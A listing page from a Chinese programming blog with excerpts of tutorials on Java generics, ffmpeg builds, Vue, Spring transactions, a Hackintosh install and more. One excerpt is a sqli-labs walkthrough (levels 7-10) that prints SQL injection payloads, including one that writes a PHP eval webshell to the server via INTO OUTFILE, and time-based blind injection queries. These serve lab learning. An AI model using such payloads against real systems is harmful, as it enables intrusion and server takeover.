<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cde75ed3f2a522ca9f09c5a24b86ec02/" rel="bookmark">
			泛型在类中的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、泛型是什么？二、泛型的使用1.泛型类2.泛型接口3.泛型方法4.泛型限制类型5.泛型中的通配符 ？ 作用注意 前言 泛型的学习
提示：以下是本篇文章正文内容，下面案例可供参考
一、泛型是什么？ 泛型，即“参数化类型”，就是将类型由原来的具体类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。
二、泛型的使用 1.泛型类 代码如下（示例）：
public class DemoT&lt;T&gt; { private T data; public T getData(){ return data; } public void setData(){ this.data = data; } } 案例
public class Person&lt;A&gt; { private String name; private int age; private A data; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cde75ed3f2a522ca9f09c5a24b86ec02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31cf93a906c6e29880517736366c5708/" rel="bookmark">
			iOS 添加PrefixHeader.pch文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		iOS 添加PrefixHeader.pch文件 根据图中所示：找到pch配置项
Precompile Prefix Header 设置为YES
Prefix Header 设置为 $(SRCROOT)/文件所在项目目录/PrefixHeader.pch
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23ef8d494ab70383205422a4bc368b9c/" rel="bookmark">
			C&#43;&#43;实操 - True and false
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在C11标准文档中，规定了关系运算符 &lt;、&gt; 、&lt;= 、&gt;=的运算结果，真时返回1，假时返回0，返回类型为整型。 运算符==、!=和关系运算符类似，除了运算优先级较低以外，也是返回1或0。 真(True)的定义是非0，所以假(False)的定义就是整型的0值。 C语言本身只有一个_Bool定义，是一个关键字。 _Bool类型是一个对象，存储0和1两个值，是一个无符号的整型。 如下程序所示，_Bool只有0和1，即假和真两个值，赋值时非0都看作1。 任何一个标量值给_Bool类型变量赋值，如果等于0，赋值为0，否则就赋值为1。 #include &lt;stdio.h&gt; int main() { _Bool varA; varA = 2; printf("varA:%d.\n",varA); varA = -1; printf("varA:%d.\n",varA); varA = 0; printf("varA:%d.\n",varA); printf("Hello world!\n"); return 0; } $ gcc -o tof tof.c $ ./tof varA:1. varA:1. varA:0. Hello world! 为了更方便程序员对布尔类型的使用，C语言的标准库，头文件&lt;stdbool.h&gt;，定义了和布尔操作相关的类型。 stdbool.h ​ /* Copyright (C) 1998, 1999, 2000, 2009 Free Software Foundation, Inc. This file is part of GCC. GCC is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3, or (at your option) any later version.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23ef8d494ab70383205422a4bc368b9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/791063c5038e2621672c1e47925f5b69/" rel="bookmark">
			总结3（9.20-9.26）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开学第3周，本周在常规课程学习的基础上，报名了六级考试，开始坚持每天背一点单词。完成了李沐深度学习5-8课时的学习，以下是我对部分作业题的代码编写和总结。
三、线性代数作业题 3.1.我们在本节中定义了形状（2,3,4）的张量X。len(X)的输出结果是什么？对于任意形状的张量X,len(X)是否总是对应于X特定轴的长度?这个轴是什么? import torch X = torch.arange(24).reshape(2, 3, 4) len(X) 输出结果为2。因为len(X)的输出总是对应第0轴的长度。
3.2.运行A/A.sum(axis=1)，看看会发生什么。你能分析原因吗？ A=torch.arange(20).reshape(5,4) A/A.sum(axis=1) #改为A/A.sum(axis=0)可行 输出结果报错，因为A是5*4矩阵A.sum(axis=1)是一个1*5向量无法触发广播机制。若改为axis=0，则可行。
3.3.当你在曼哈顿的两点之间旅行时，你需要在坐标上走多远，也就是说，就大街和街道而言？你能斜着走吗？ 不能斜着走，用一范数来刻画距离。
3.4.向linalg.norm函数提供3个或更多轴的张量，并观察其输出。对于任意形状的张量这个函数计算得到什么?
A=torch.ones(12).reshape(2,2,3) print(A) A=A.float() torch.norm(A)##所有值的L2范数 输出结果：
tensor(3.4641) 对更多轴的张量求范数时，仍然是把所有数据进行求。
四、微分和求导作业题 4.1.绘制函数和其在x = 1处切线的图像。 import numpy as np from d2l import torch as d2l x=np.arange(0.5,2,0.1)#生成一组数，起点x=0.5，终点x=2，步长是0.1 def f(x): return x**3-x**(-1) d2l.plot(x,[f2(x),4*x-4],'x','f(x)',legend=['f(x)','Tangent line (x=1)']) 输出结果：
4.2.为什么计算二阶导数比一阶导数的开销要更大？ 因为计算二阶导数需要先求一阶导数。
4.3.在运行反向传播函数之后，立即再次运行它，看看会发生什么。 会报错，因为不允许连续backward，前向过程建立计算图，反向传播后释放需要更新x.grad才可以再backward。
4.4.在控制流的例子中，我们计算d关于a的导数，如果我们将变量a更改为随机向量或矩阵，会发生什么？此时，计算结果f(a)不再是标量。结果会发生什么？我们如何分析这个结果？ 对向量矩阵直接进行反向传播会报错。对非标量调用`backward`需要传入一个`gradient`参数，该参数指定微分函数关于`self`的梯度。
4.5.重新设计一个求控制流梯度的例子。运行并分析结果。 def f(a): if a.norm() &gt; 10: b = 2*a else: b = a+2 return b a = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/791063c5038e2621672c1e47925f5b69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/868757481f681633d05142b79770cde3/" rel="bookmark">
			ffmpeg编译命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		./configure --prefix=/usr/local/ffmpeg --pkg-config-flags="--static" --enable-gpl --enable-small --enable-nonfree --enable-libfdk-aac --enable-libx264 --enable-filter=delogo --enable-debug --disable-optimizations --enable-libmp3lame --disable-asm --enable-pic --enable-pthreads --enable-libopus --enable-libspeex --enable-libvorbis --enable-shared
make
make install
在当前终端设置环境变量：export PKG_CONFIG_PATH="/usr/local/lib/pkgconfig"
参数意义：
--prefix=/usr/local/ffmpeg 安装程序到指定目录（默认/usr/local）
--enable-gpl 允许使用GPL（默认关闭）
--enable-small 启用优化文件尺寸大小
--enable-nonfree 允许使用非免费的代码， 产生的库和二进制程序将是不可再发行的
--enable-libfdk-aac 使能aac编码（默认关闭）
--enable-x264 启用H.264编码（默认关闭）
--enable-filter=delogo 使能去水印记功能（默认关闭）
--enable-debug 用来控制编译器比如gcc的debug level选项的不是控制ffmpeg的debug level选项的
--disable-optimizations 禁用编译器优化
--enable-libmp3lame 使能lame mp3编码
--disable-asm 禁用全部汇编程序优化
--enable-pic 创造不依赖(于)位置的代码
--enable-pthreads 启用pthreads（多线程）（默认关闭，可能会有线程安全问题）
--enable-libopus 使能opus编码
--enable-libspeex 使能speex编码
--enable-libvorbis 通过 libvorbis 启用 Vorbis 编码方式，本地装置存在（默认：关闭）
--enable-static 构建静态库（默认启用）
--enable-shared 构建共享库（默认关闭）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/868757481f681633d05142b79770cde3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7a31b3c7574db86d88788484d69be3c/" rel="bookmark">
			System.getProperty(“spring.config.location“)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中在启动类里面出现System.getProperty(“spring.config.location”)的相关代码，进行一番了解后才了解这段代码含义。
首先spring.config.location是spring boot中的一个固定配置，只能在启动包的时候在命令行内起作用。
java -jar application.jar --spring.config.location=C:/application.properties 其含义是：项目主动加载指定的配置文件
官方文档解释如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1674e589c85ad9e5b543bf3892e04ecb/" rel="bookmark">
			Vue2.js （2）引入开发组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.如何引入Vue2（通过CDN） https://cn.vuejs.org/v2/guide/instance.html - 【学习】-【安装】- section CDN
!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;!-- 引入 Vue，通过使用CDN --&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.6.14"&gt;&lt;/script&gt; &lt;/head&gt; 2.如何引入Element UI https://element.eleme.io/#/zh-CN/component/installation - 【组件】-【安装】-section CDN
&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;!-- 引入CDN --&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.6.14"&gt;&lt;/script&gt; &lt;!-- 引入Element UI样式 --&gt; &lt;link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css"&gt; &lt;!-- 引入Element UI组件库 --&gt; &lt;script src="https://unpkg.com/element-ui/lib/index.js"&gt;&lt;/script&gt; &lt;/head&gt; 3.引入axios发送Ajax请求 http://www.axios-js.com/zh-cn/docs/ -【文档】-【安装】 &lt;head&gt; &lt;meta charset="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1674e589c85ad9e5b543bf3892e04ecb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5359791d33911a60de4589d43595a36b/" rel="bookmark">
			秋招笔试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.掌qu 1.单列表实现栈
class Node{ //https://blog.csdn.net/wuzhaojun1st/article/details/78010693 Object element; Node next; public Node(Object element) { this(element,null); } public Node(Object element, Node next) { this.element = element; this.next = next; } public Object getElement() { return element; } } class ListStack{ Node header;//栈顶元素 int elementCount;//栈内元素个数 int size;//栈的大小 public ListStack() { header=null; elementCount=0; size=0; } public ListStack(int size) { header=null; elementCount=0; this.size=size; } public void setHeader(Node header) { this.header = header; } public boolean isFull(){ if (elementCount==size){ return true; } return false; } public boolean isEmpty(){ if (elementCount==0){ return true; } return false; } public void push(Object value){ if (this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5359791d33911a60de4589d43595a36b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/869561cd3eb1aa5cb42644a6981522ad/" rel="bookmark">
			Python使用socket无损连续传输ndArray图片，简单快速的方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python使用socket无损连续传输ndArray图片 工程目的：让C++工程调用其他机器里的python深度学习算法
目前成果：测试完成了本机python之间使用socket连续传输无损array格式图片，本机发送几乎无延迟，局域网发送取决于路由器带宽
测试结果 客户端 发送图片数据 将cv2.VideoCapture改成你使用的图片读取方式即可
IP和端口改成和服务器一致，服务器ip就是主机的局域网ip
import socket import time import cv2 import numpy as np # 创建socket tcp_client_socket = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # 目的信息 服务器IP server_ip = "192.168.1.113" server_port = 8088 # 链接服务器 tcp_client_socket.connect((server_ip, server_port)) # 海康网络监控相机读取视频流 1280*720 RGB uint8 capture = cv2.VideoCapture('rtsp://用户名:密码@相机IP/Streaming/Channels/101') cv2.namedWindow('camera',cv2.WINDOW_NORMAL) while capture.isOpened() : success, frame = capture.read() # 视频结束 if not success : print('Video Reading Finished!') break # 按q结束 if cv2.waitKey(1) &amp; 0xff == ord('q') : # 释放所有资源 cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/869561cd3eb1aa5cb42644a6981522ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/496ada0ea03cb7242635338d42366bc9/" rel="bookmark">
			SQL注入详解 7-10关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 Less-7（outfile 导入文件）Less-8（布尔盲注+时间盲注）Less-9（时间盲注）Less-10（时间盲注） Less-7（outfile 导入文件） 第七关总结：
第七关的标题为dump into outfile,这表明我们需要利用文件导入来进行注入，这里首先需要判断注入类型，然后导入的路径我们可以根据前几关来确定，在真实环境我们可以利用报错来得到一些路径，也可以判断服务器的类型，根据网站的默认路径等来获得绝对路径
判断注入类型 1' 1')) and 1=1--+ 1')) and 1=2--+ 导入一句话木马 -1')) union select 1,"&lt;?php @eval($_POST[shell]); ?&gt;",3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\sqllabs\\Less-7\\shell.php"--+ 蚁剑连接成功
Less-8（布尔盲注+时间盲注） 第八关总结：
通过测试，第八关这里考察的是sql盲注，但是这里限制了报错注入，我们只能通过布尔盲注和时间盲注来确定，具体操作与第五关一样
猜解思路： 1. 猜解当前数据库名长度 2. 猜解数据库名（二分法猜解） 3. 猜解当前数据库中表的个数 4. 猜解每个表名的长度 5. 猜解表名（二分法猜解） 6. 猜解某个表中列的个数 7. 猜解每个列名的长度 8. 猜解列名（二分法猜解） 9. 猜解某个列中数据的个数 10. 采集每个数据的长度 11. 猜解收据（二分法猜解） Less-9（时间盲注） 第九关总结：
第九关也是属于盲注类型，这个盲注由于不能明确的判断出字段数（因为这里的回显不改变，都是You are in… 从而无法判断），我们在这里可以进行时间盲注
开挂（查看源码）：
判断注入类型
等待5s才得到返回页面，说明注入类型是单引号字符型
判断当前数据库名长度
1' and if((length(database())=8),sleep(5),1)--+ 猜解数据库名（二分法猜解，这里只猜解了一个字母，其他的类似） 1' and if((ascii(substr((select database()),1,1))=115),sleep(5),1)--+ 猜解当前数据库表的数量 1' and if(((select count(table_name) from information_schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/496ada0ea03cb7242635338d42366bc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/485f2a5870dbaa9d214156bb4a363e99/" rel="bookmark">
			Ubuntu20.04系统联网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当刚安装好Ubuntu20.04的时候网络是没有连接的，此时需执行下列步骤进行联网：
1.选择你要进行联网的虚拟机
2.鼠标点击右键选择设置
3.点击网络适配器，如果硬件里面没有显示，则点击左下角的添加，添加网络适配器，后点击完成
4.点击网络适配器，选择自定义：特定虚拟网络，选择VMnet8（NAT）模式，后点击确定
5.重启系统，之后就可以正常联网了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1ddd3b022f58a1d11ba248a1fd2ea0d/" rel="bookmark">
			vue实现打印功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue实现打印功能 安装npm i vue-print-nb在main.js中引入并注册 // 打印 import Print from '@/plugins/print' // 注册 Vue.use(Print) 3.公共的js方法（我写在plugins里面）
// 打印类属性、方法定义 /* eslint-disable */ const Print = function (dom, options) { if (!(this instanceof Print)) return new Print(dom, options); this.options = this.extend({ 'noPrint': '.no-print' }, options); if ((typeof dom) === "string") { this.dom = document.querySelector(dom); } else { this.isDOM(dom) this.dom = this.isDOM(dom) ? dom : dom.$el; } this.init(); }; Print.prototype = { init: function () { var content = this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1ddd3b022f58a1d11ba248a1fd2ea0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07b46c19b261a2e7c2d3b232627f9f64/" rel="bookmark">
			解决远程搜索select框focus()聚焦后无光标无法输入的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决远程搜索select框focus()聚焦后无光标无法输入的问题 实测antd和elementUI通用（需求为全键盘操作） html内容
&lt;a-select ref="searchSelectRef" show-search &gt; &lt;a-select-option v-for="(d, index) in list" :key="index" :value="d.id"&gt; {{ d.name }} &lt;/a-select-option&gt; &lt;/a-select&gt; JS部分
一般使用this.$refs.searchSelectRef.focus()发现已经聚焦成功边框高亮，但是无法输入，需要按下空格或者下箭头（antd）才会出现光标输入不满足需求。替换为下面的代码可解决：
this.$refs.searchSelectRef.$el.querySelector('input').click() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a6b578fa8cc8e4a4f8da987d6a3d720/" rel="bookmark">
			用selenium获取某东商品用户评论来做数据分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如图需要获取小米11的用户评论 网址：https://item.jd.com/100009958327.html
1.分析网页会发现利用selenium不用处理复杂的反爬会比较好（不过在此需要对selenium有扎实的基本功）
我们需要获取的信息有：
买 家 昵 称 ， 手机颜色, 配置, 评 论 时 间, 买 家 评 星, 评论 2.接下来导入模块创建浏览器对象：
from selenium.webdriver import Chrome from selenium.webdriver.chrome.options import Options import csv from time import sleep web = Chrome() web.implicitly_wait(5) # 隐式等待5秒 web.get('https://item.jd.com/100009958327.html') 3.当我们浏览器打开这个网页的时候会发现评论信息根本无法加载处理，因为这是一个Ajas请求，利用js代码下拉滚动条加载数据，把下拉条拖到最下面即可
js = 'var a = document.documentElement.scrollTop=1000000' # js代码滚动条下拉 web.execute_script(js) sleep(1) web.execute_script(js) 4.定位到需要获取的数据
# 用户昵称 user_name_list = web.find_elements_by_xpath("//div[@class='user-info']") # 评星 star = web.find_elements_by_xpath('//div[@class="comment-column J-comment-column"]/div[1]') # 手机颜色 color = web.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a6b578fa8cc8e4a4f8da987d6a3d720/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6d0809d7af8f98c2f3b9bc6e4055e5d/" rel="bookmark">
			2021-09-24
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		此教程仅用于初入黑苹果的小白学习交流经验，每个人的环境配置不同，不能一概而论，如若安装过程出现任何意外将与本人无关。
UEFI+GPT是前提，如果是传统引导方式的，请自行查看变色龙方法，AMD用户请绕道行驶，此教程适用于原版Mac OS系统的安装。首先需要下载工具：
MacOS的系统镜像，这个不用多说，不然拿什么装系统（自行下载）
TransMac
DiskGenius
EasyUEFI(可选）
U盘一枚（10.14及以下版本系统8G足以，10.15少则16G，多则不限）
一、制作安装U盘
需要用到的工具是TransMAC,插入U盘，右键管理员身份运行，在左侧边栏右键选择U盘（千万不要选错），选择Format Disk for Mac
接着选择第一个选项，然后OK
等待进度条走完之后重新右键选择U盘，选择Restore with Disk Image，在弹出的窗口中选择你所下载的原版镜像，继续点OK,剩下就是漫长的等待
跑完进度条之后可能会出现格式化的提示，直接取消不用管。
接着就要用到DiskGenius对刚才写入到U盘的CLOVER进行简单的修改。找到你的U盘，接着打开我箭头所指的路径
这时候你会看到很多的config*****.plist文件，找到与你核显名称相对应的配置文件，重命名为config.plist。如果没有看到其他的.plist文件，可能在此路径的config-Other文件夹下（视情况而定），如果是在config-Other文件夹，就需要在重新命名后将此配置文件移动替换到CLOVER文件夹内
二、对磁盘进行分区
对磁盘进行分区这一步在第三步能够进入到安装界面的时候再回来进行也不晚（数据无价，谨慎操作），***如果你是两块硬盘，你想要在那一块硬盘上安装黑苹果，就需要在哪块硬盘上创建ESP分区，不然可能到格式化成苹果APFS分区的时候回出错。***下面按照我图中进行操作，这一步要在上一步进度条走完之后进行，不然磁盘管理不显示磁盘
选择一个空闲磁盘较大的分区，在点击压缩卷
根据自己实际情况决定分区大小，但也别太小，少则三四十G，多则不限
点击压缩，会出现一个新分区，然后再右键新分区新建简单卷
一直点下一步就可以了，最后一步要格式化的时候我的习惯是格成NTFS，安装黑苹果的时候容易在苹果的磁盘工具中显示分区
三、安装MAC OS
***将U盘插入电脑的USB2.0接口，3.0可能会出禁止符号。***接着设置BIOS进行U盘启动，U盘启动请自行解决，不多赘述，不同的厂商的电脑启动快捷键可能不同，不能一概而论。戴尔笔记本可能需要禁用安全模式，其他自测。
进行U盘启动后会看到类似这样的界面，我更换了主题所以跟你们U盘的启动界面不太一样，左右进行选择，注意看那一行英文提示Boot macOS Install from Install macOS这就说明所选择的是你U盘内的苹果系统，直接Enter进入
不出意外的话会进行跑码，这里的跑码是为了方便看到启动过程，更容易排错
如果能顺利进入安装界面，那么恭喜你，省去好多麻烦，但如果是在跑码的过程中卡到某一条，那就需要修改你的CLOVER，先记下卡住的那条代码自行搜索，在这里不多阐述，运气不好会出现各种各样的问题
进入安装界面之后，如果上面第二步没有进行分区，就可以重启去win下分区，已分区的请继续选择磁盘工具，继续
选择你刚才分好的那个区，点击抹掉
名称随便取，能记着就行，格式选择APFS，然后点击抹掉
完成后左上角关闭，接着选择安装，继续
到选择磁盘的时候就先则你刚才抹盘后的那个磁盘，我这里用的是移动硬盘所以是黄色的，正常的图标是左边那样的，看名称就好
安装是一个漫长的过程，期间会自动重启，正常现象，但在每次重启之后要先选择你的U盘启动，U盘启动之后还要选择正确的分区启动，注意看我方框圈住的，选择你刚才抹盘时填入的分区名称启动，然后就是跑码，这次安装过程还会再重启一次，重启再重复刚才的过程就好
安装顺利不出意外的话就可以进入到系统设置了，系统设置就不用多说了。至此，黑苹果安装已完成，剩下的就是将U盘中的CLOVER导入到硬盘中的ESP分区→EFI文件夹内。想设置黑苹果CLOVER为第一启动项的继续看，不设置想看看也没坏处。
打开EasyUEFI
第三步要看自己硬盘情况进行选择，选择自己刚才拷贝过CLOVER的分区
接着选择自己命名的那条移动到第一就ok了
安装完黑苹果这才是开始，最主要的就是完善黑苹果，需要安装各种合适的驱动，或者打补丁。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a53e81a41edf239c213929d288225ab2/" rel="bookmark">
			python学习五十九(总结）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件操作：
os模块：
os模块
import os:导入os模块
os.path
dirname(path):去掉文件名返回目录
join:将路径组合返回
split：将文件名与路径分隔开
splittext：将文件名与扩展名分开
getsize():获取文件大小
isabs：是否为绝对路径
isdir：用于判断某一对象(需提供绝对路径)是否为目录
isfile：用于判断某一对象(需提供绝对路径)是否为文件
os
getcwd()：返回当前进程的工作目录
chdir()：用于改变当前工作目录到指定的路径
listdir()：用于返回指定的文件夹包含的文件或文件夹的名字的列表。
mkdir():创建路径中的最后一级目录
rmdir():用于删除指定路径的目录
remove():删除指定路径的文件
,如果指定的路径是一个目录,将抛出OSError
异常：
语法错误
异常
系统抛出异常
list1=[]
list1.pop()
处理异常：
try:
可能发生异常代码
except:
有异常才会进入代码
[excepct:异常类型 as err:
…]
[ else:
没有异常才会进入代码
]
[
finally:
无论有没有异常都会执行的代码
]
抛出异常：手动异常 raise
格式：
raise 异常类型 （’提示异常信息’)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c69a8ee365961785934466ffbaf5549/" rel="bookmark">
			python学习五十八（抛出异常）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 异常抛出 异常抛出 系统未定义的错误，自己来定义错误时需要使用raise手动扔出异常。
#抛出异常 raise #注册 用户名必须6位 def register(): username = input('输入用户名：') if len(username) &lt; 6: raise Exception('用户长度必须六位以上') else: print('输入的用户名是:'.username) try: register() except Exception as err: print(err) print('注册失败！') else: print('注册成功！') 输入用户名：as 用户长度必须六位以上 注册失败！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/566b4eeb32859d620f8e5644980e2696/" rel="bookmark">
			详解 spring 声明式事务(@Transactional)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring事务有2种用法：编程式事务和声明式事务。
编程式事务上一篇文章中已经介绍了，不熟悉的建议先看一下编程式事务的用法。
这篇主要介绍声明式事务的用法，我们在工作中基本上用的都是声明式事务，所以这篇文章是比较重要的，建议各位打起精神，正式开始。
什么是声明式事务？ 所谓声明式事务，就是通过配置的方式，比如通过配置文件（xml）或者注解的方式，告诉spring，哪些方法需要spring帮忙管理事务，然后开发者只用关注业务代码，而事务的事情spring自动帮我们控制。
比如注解的方式，只需在方法上面加一个@Transaction注解，那么方法执行之前spring会自动开启一个事务，方法执行完毕之后，会自动提交或者回滚事务，而方法内部没有任何事务相关代码，用起来特别的方法。
@Transaction public void insert(String userName){ this.jdbcTemplate.update("insert into t_user (name) values (?)", userName); } 声明式事务的2种实现方式 配置文件的方式，即在spring xml文件中进行统一配置，开发者基本上就不用关注事务的事情了，代码中无需关心任何和事务相关的代码，一切交给spring处理。
注解的方式，只需在需要spring来帮忙管理事务的方法上加上@Transaction注解就可以了，注解的方式相对来说更简洁一些，都需要开发者自己去进行配置，可能有些同学对spring不是太熟悉，所以配置这个有一定的风险，做好代码review就可以了。
配置文件的方式这里就不讲了，用的相对比较少，我们主要掌握注解的方式如何使用，就可以了。
声明式事务注解方式5个步骤 1、启用Spring的注释驱动事务管理功能
在spring配置类上加上@EnableTransactionManagement注解
@EnableTransactionManagement public class MainConfig4 { } 简要介绍一下原理：当spring容器启动的时候，发现有@EnableTransactionManagement注解，此时会拦截所有bean的创建，扫描看一下bean上是否有@Transaction注解（类、或者父类、或者接口、或者方法中有这个注解都可以），如果有这个注解，spring会通过aop的方式给bean生成代理对象，代理对象中会增加一个拦截器，拦截器会拦截bean中public方法执行，会在方法执行之前启动事务，方法执行完毕之后提交或者回滚事务。稍后会专门有一篇文章带大家看这块的源码。
如果有兴趣的可以自己先去读一下源码，主要是下面这个这方法会
org.springframework.transaction.interceptor.TransactionInterceptor#invoke 再来看看 EnableTransactionManagement 的源码
@Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Import(TransactionManagementConfigurationSelector.class) public @interface EnableTransactionManagement { /** * spring是通过aop的方式对bean创建代理对象来实现事务管理的 * 创建代理对象有2种方式，jdk动态代理和cglib代理 * proxyTargetClass：为true的时候，就是强制使用cglib来创建代理 */ boolean proxyTargetClass() default false; /** * 用来指定事务拦截器的顺序 * 我们知道一个方法上可以添加很多拦截器，拦截器是可以指定顺序的 * 比如你可以自定义一些拦截器，放在事务拦截器之前或者之后执行，就可以通过order来控制 */ int order() default Ordered.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/566b4eeb32859d620f8e5644980e2696/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf8a4d5cd46935919e8202a29a18c244/" rel="bookmark">
			解决：nested exception is org.apache.ibatis.binding.BindingException: Parameter ‘XXX‘ not found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息 org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.binding.BindingException: Parameter 'xxx' not found. Available parameters are [0, 1, param1, param2] 报错原因 1、在使用mybatis开发的时候，有时候需要传入多个参数进行查询，当传入多个参数时，不处理便会出现上面的异常报错，这时需要@Param注解
2、mapper.xml映射没有得到传入的参数，这个时候需要在mapper层变化传参。
现象一：多参未处理 错误代码（mapper.java）：
void batchInsert(Integer userId,Integer[] roleIds); 正确代码（mapper.java）：
void batchInsert(@Param("userId")Integer userId,@Param("roleIds")Integer[] roleIds); ---------------------------------------------------------------------------------------------------------------------------------
@Param：
